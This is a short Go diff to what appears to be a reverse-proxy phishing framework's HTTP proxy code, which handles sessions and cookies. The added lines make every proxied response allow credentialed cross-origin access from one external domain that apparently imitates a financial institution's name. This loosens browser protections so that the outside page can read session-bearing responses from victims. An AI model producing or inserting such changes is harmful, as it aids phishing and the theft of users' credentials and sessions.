@@ -884,7 +884,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if resp == nil {
 				return nil
 			}
-
+            resp.Header.Set("Access-Control-Allow-Origin", "https://online.safehevanmfb.com")
+			resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			// handle session
 			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
